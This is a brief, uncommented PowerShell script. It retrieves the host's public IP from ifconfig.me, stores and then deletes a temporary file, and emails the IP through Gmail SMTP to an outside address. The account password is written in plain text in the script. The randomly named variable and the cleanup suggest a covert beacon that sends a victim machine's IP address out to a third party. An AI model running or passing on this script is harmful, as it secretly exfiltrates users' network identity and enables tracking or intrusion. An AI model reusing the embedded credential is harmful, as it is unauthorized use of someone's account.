(Invoke-WebRequest -Uri ifconfig.me/ip).Content > "hello.txt"
$oNumpPlFnH = Get-Content hello.txt
Remove-Item hello.txt
Send-MailMessage -From underthetablejade@gmail.com -To underthetablejade@gmail.com -Subject Something -Body  $oNumpPlFnH -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList underthetablejade@gmail.com, (ConvertTo-SecureString -String 6922568729956382Za! -AsPlainText -Force))